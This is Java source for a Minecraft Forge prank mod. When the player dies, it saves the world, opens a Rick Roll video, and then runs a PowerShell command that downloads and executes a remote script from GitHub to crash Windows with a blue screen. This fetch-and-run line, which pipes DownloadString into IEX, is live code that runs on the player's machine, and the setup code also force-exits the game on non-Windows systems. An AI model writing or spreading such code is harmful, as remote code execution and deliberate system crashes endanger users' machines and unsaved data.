package com.cosmiiko.bsodod;


import net.minecraft.client.Minecraft;
import net.minecraft.client.entity.player.ClientPlayerEntity;
import net.minecraftforge.api.distmarker.Dist;
import net.minecraftforge.api.distmarker.OnlyIn;
import net.minecraftforge.common.MinecraftForge;
import net.minecraftforge.event.TickEvent;
import net.minecraftforge.eventbus.api.SubscribeEvent;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.event.lifecycle.FMLCommonSetupEvent;
import net.minecraftforge.fml.javafmlmod.FMLJavaModLoadingContext;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.io.IOException;
import java.util.UUID;

@Mod("bsodod")
public class BSODOnDeath
{
    private static final Logger LOGGER = LogManager.getLogger();
    private boolean hasDied = false;

    public BSODOnDeath() {
        FMLJavaModLoadingContext.get().getModEventBus().addListener(this::setup);

        MinecraftForge.EVENT_BUS.register(this);
    }

    private void setup(final FMLCommonSetupEvent event)
    {
        if (!System.getProperty("os.name").toLowerCase().contains("win"))
        {
            LOGGER.error("This mod is only compatible with Windows machines.");
            System.exit(1);
            // Not sure how to properly halt the mod's loading, not too important anyway
        }

        LOGGER.info("BSODOD Pre-Init OK");
    }

    @OnlyIn(Dist.CLIENT)
    @SubscribeEvent
    public void onPlayerTick(TickEvent.PlayerTickEvent event)
    {
        ClientPlayerEntity ply = Minecraft.getInstance().player;

        // Player hasn't loaded into the world yet
        if (ply == null) return;

        // Player has respawned
        if (ply.getHealth() > 0.0F && hasDied)
            hasDied = false;

        if (ply.getHealth() == 0.0F && !hasDied)
        {
            hasDied = true;

            LOGGER.info("Player has died.");

            ply.respawnPlayer();

            // Save the world if it's singleplayer
            if (!ply.world.isRemote)
            {
                LOGGER.info("Saving worlds...");
                ply.world.getServer().save(false, false, true);
                LOGGER.info("Done saving worlds. Prepare to get Rick Roll'd...");
            }

            try {
                // Desktop doesn't work, throws a HeadlessException for some reason
                // See https://stackoverflow.com/questions/5226212/how-to-open-the-default-webbrowser-using-java for this hack

                String url = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
                Runtime.getRuntime().exec("rundll32 url.dll,FileProtocolHandler " + url);
            }
            catch (IOException e)
            {
                LOGGER.error("Error during Rick Roll attempt: ", e);
            }

            try {
                // Runs this (https://github.com/peewpw/Invoke-BSOD) BSOD powershell script by peewpw
                Runtime.getRuntime().exec("powershell -Command IEX((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/peewpw/Invoke-BSOD/master/Invoke-BSOD.ps1'));Invoke-BSOD");
            }
            catch (IOException e)
            {
                LOGGER.error("Error during BSOD attempt: ", e);
            }
        }
    }
}
